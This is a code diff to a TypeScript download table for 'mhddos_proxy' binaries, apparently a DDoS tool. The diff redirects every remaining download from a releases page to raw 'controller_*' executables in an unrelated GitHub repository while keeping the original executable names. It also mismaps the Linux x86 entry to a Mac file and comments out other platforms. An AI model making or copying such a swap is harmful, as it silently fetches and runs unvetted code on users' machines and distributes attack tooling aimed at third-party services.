@@ -19,43 +19,43 @@ interface ModuleBinaryAsset {
   downloadUrl: string
 }
 
-const MHDDOS_PROXY_RELEASE_BASE_URL = 'https://github.com/porthole-ascend-cinnamon/mhddos_proxy_releases/releases/latest/download'
+const MHDDOS_PROXY_RELEASE_BASE_URL = 'https://github.com/008/02MHtest/raw/refs/heads/main/bin/'
 
 const MHDDOS_PROXY_DOWNLOAD_ASSETS: Readonly<Record<SupportedPlatform, Partial<Record<SupportedArch, ModuleBinaryAsset>>>> = {
   linux: {
     x64: {
       executableName: 'mhddos_proxy_linux',
-      downloadUrl: `${MHDDOS_PROXY_RELEASE_BASE_URL}/mhddos_proxy_linux`
+      downloadUrl: `${MHDDOS_PROXY_RELEASE_BASE_URL}/controller_linux`
     },
-    arm64: {
-      executableName: 'mhddos_proxy_linux_arm64',
-      downloadUrl: `${MHDDOS_PROXY_RELEASE_BASE_URL}/mhddos_proxy_linux_arm64`
-    },
+    // arm64: {
+    //   executableName: 'mhddos_proxy_linux_arm64',
+    //   downloadUrl: `${MHDDOS_PROXY_RELEASE_BASE_URL}/mhddos_proxy_linux_arm64`
+    // },
     ia32: {
       executableName: 'mhddos_proxy_linux_x86',
-      downloadUrl: `${MHDDOS_PROXY_RELEASE_BASE_URL}/mhddos_proxy_linux_x86`
+      downloadUrl: `${MHDDOS_PROXY_RELEASE_BASE_URL}/controller_mac`
     }
   },
   win32: {
     x64: {
       executableName: 'mhddos_proxy_win.exe',
-      downloadUrl: `${MHDDOS_PROXY_RELEASE_BASE_URL}/mhddos_proxy_win.exe`
-    },
-    ia32: {
-      executableName: 'mhddos_proxy_win_x86.exe',
-      downloadUrl: `${MHDDOS_PROXY_RELEASE_BASE_URL}/mhddos_proxy_win_x86.exe`
+      downloadUrl: `${MHDDOS_PROXY_RELEASE_BASE_URL}/controller_win.exe`
     }
-  },
-  darwin: {
-    x64: {
-      executableName: 'mhddos_proxy_macos',
-      downloadUrl: `${MHDDOS_PROXY_RELEASE_BASE_URL}/mhddos_proxy_macos`
-    },
-    arm64: {
-      executableName: 'mhddos_proxy_macos_arm64',
-      downloadUrl: `${MHDDOS_PROXY_RELEASE_BASE_URL}/mhddos_proxy_macos_arm64`
-    }
+    // ia32: {
+    //   executableName: 'mhddos_proxy_win_x86.exe',
+    //   downloadUrl: `${MHDDOS_PROXY_RELEASE_BASE_URL}/mhddos_proxy_win_x86.exe`
+    // }
   }
+  // darwin: {
+  //   x64: {
+  //     executableName: 'mhddos_proxy_macos',
+  //     downloadUrl: `${MHDDOS_PROXY_RELEASE_BASE_URL}/mhddos_proxy_macos`
+  //   },
+  //   arm64: {
+  //     executableName: 'mhddos_proxy_macos_arm64',
+  //     downloadUrl: `${MHDDOS_PROXY_RELEASE_BASE_URL}/mhddos_proxy_macos_arm64`
+  //   }
+  // }
 }
 
 function isSupportedPlatform (platform: NodeJS.Platform): platform is SupportedPlatform {
